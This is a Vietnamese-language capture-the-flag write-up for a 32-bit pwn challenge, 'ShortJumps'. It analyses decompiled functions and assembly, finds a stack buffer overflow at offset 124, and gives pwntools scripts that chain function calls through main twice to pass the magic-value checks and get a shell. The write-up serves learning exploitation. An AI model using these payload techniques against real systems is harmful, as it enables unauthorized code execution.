# ShortJumps

**chall này ko hiểu sao mà mình dùng ida dịch hàm main ra C không được nhưng mà coi được 2 hàm jmp1 và jmp2**

## ida

```c 
int __cdecl jmp2(int a1, int a2)
{
  int result; // eax
  char command[12]; // [esp+8h] [ebp-10h] BYREF

  strcpy(command, "/bin/sh");
  result = jmp;
  if ( jmp != 1 )
  {
    puts("Don't cheat, hacker!");
    exit(0);
  }
  if ( a1 == 0xCAFEBABE )
  {
    result = a2 - 0x35014542;
    if ( a2 == 0x48385879 )
      return system(command);
  }
  return result;
}

Elf32_Dyn **__cdecl jmp1(int a1)
{
  Elf32_Dyn **result; // eax

  result = &GLOBAL_OFFSET_TABLE_;
  if ( a1 == 0xDEADBEEF )
    ++jmp;
  return result;
}
```

ở đây **jmp2 có shell với điều kiện jmp == 1**, vậy ta cần đi qua jmp1 rồi mới qua jmp2

thôi thì hàm main ko dịch được ta xem tạm asm z:

```asm 
endbr32
lea     ecx, [esp+4]
and     esp, 0FFFFFFF0h
push    dword ptr [ecx-4]
push    ebp
mov     ebp, esp
push    ebx
push    ecx
add     esp, 0FFFFFF80h
call    __x86_get_pc_thunk_bx
add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)
mov     [ebp+var_79], 59h ; 'Y'
call    init
sub     esp, 0Ch
lea     eax, (aHiWhatSYourNam - 804C000h)[ebx] ; "Hi, what's your name?"
push    eax             ; s
call    _puts
add     esp, 10h
sub     esp, 0Ch
lea     eax, (asc_804A033 - 804C000h)[ebx] ; "> "
push    eax             ; format
call    _printf
add     esp, 10h
sub     esp, 8
lea     eax, [ebp+var_28]
push    eax
lea     eax, (a31s - 804C000h)[ebx] ; "%31s"
push    eax
call    ___isoc99_scanf
add     esp, 10h
call    _getchar
sub     esp, 0Ch
lea     eax, (aDoYouHaveAnyDr - 804C000h)[ebx] ; "Do you have any dream? [Y/n]"
push    eax             ; s
call    _puts
add     esp, 10h
sub     esp, 0Ch
lea     eax, (asc_804A033 - 804C000h)[ebx] ; "> "
push    eax             ; format
call    _printf
add     esp, 10h
sub     esp, 8
lea     eax, [ebp+var_79]
push    eax
lea     eax, (aC - 804C000h)[ebx] ; "%c"
push    eax
call    ___isoc99_scanf
add     esp, 10h
movzx   eax, [ebp+var_79]
cmp     al, 59h ; 'Y'
jz      short loc_8049433

loc_8049433:
sub     esp, 0Ch
lea     eax, (aTellMeYourDrea - 804C000h)[ebx] ; "Tell me your dream!"
push    eax             ; s
call    _puts
add     esp, 10h
sub     esp, 0Ch
lea     eax, (asc_804A033 - 804C000h)[ebx] ; "> "
push    eax             ; format
call    _printf
add     esp, 10h
sub     esp, 8
lea     eax, [ebp+var_78]
push    eax
lea     eax, (a140s - 804C000h)[ebx] ; "%140s"
push    eax
call    ___isoc99_scanf
add     esp, 10h
call    _getchar
sub     esp, 0Ch
lea     eax, (aWowThatSIntere - 804C000h)[ebx] ; "Wow, that's interesting!"
push    eax             ; s
call    _puts
add     esp, 10h
```

phân tích qua hàm main l**ần nhập đầu cho nhập 31byte không làm gì cả**, **sau đó nhập Y, nếu nhập Y thì nó cho phép nhập 140byte,** thử nhập xem sao:

![image](https://github.com/gookoosss/CTF/assets/128712571/824d4131-8070-43b2-804d-5be20114acdf)


ồ nếu vậy thì c**ó lỗi BOF vs offset là 124**

hmm  nếu vậy thì **ta còn dư 16byte để setup**

**h ta làm ret2win đơn giản bằng script này xem sao:**

## Test

```python 
from pwn import *

p = process('./shortjumps')
exe = ELF('./shortjumps')


gdb.attach(p, gdbscript = '''
b*main+282
c
''')

input()

p.sendlineafter(b'> ', b'giabao')

payload = b'a'*124
payload += p32(exe.sym['jmp1'])
payload += p32(exe.sym['jmp2']) + p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)

p.sendlineafter(b'> ', b'Y')
p.sendlineafter(b'> ', payload)

p.interactive()
```

hmm ko được rồi

![image](https://github.com/gookoosss/CTF/assets/128712571/d1d54e97-aaae-452f-85fb-41eeed1ed6d3)


**đến đây ta cần thêm p32(0x13371337 - 0xf7d01500) nữa , nhưng mà payload của ta đã đủ 140byte rồi**

ta còn 1 cách nữa là **chạy lại hàm main 1 lần nữa, lần 1 setup jmp1, lần 2 setup jmp2**, như thế thì ta có thể thoải mái setup thỏa điều kiện rồi

đến đây thì quá đơn giản rồi, viết script và lấy shell thôi

## script

```python
from pwn import *

p = process('./shortjumps')
exe = ELF('./shortjumps')


gdb.attach(p, gdbscript = '''
b*main+282
c
''')

input()

pop_edi_ebp = 0x08049502

p.sendlineafter(b'> ', b'giabao')

# payload = b'a'*124
# payload += p32(exe.sym['jmp1'])
# payload += p32(exe.sym['jmp2']) + p32(0xDEADBEEF)
# payload += p32(0xCAFEBABE)

payload = b'a'*124
payload += p32(exe.sym['jmp1'])
payload += p32(exe.sym['main']) + p32(0xDEADBEEF)

p.sendlineafter(b'> ', b'Y')
p.sendlineafter(b'> ', payload)

p.sendlineafter(b'> ', b'giabao')

payload = b'a'*124
payload += p32(exe.sym['jmp2'])
payload += p32(0xCAFEBABE) + p32(0xCAFEBABE)
payload += p32(0x48385879)


p.sendlineafter(b'> ', b'Y')
p.sendlineafter(b'> ', payload)

p.interactive()
```

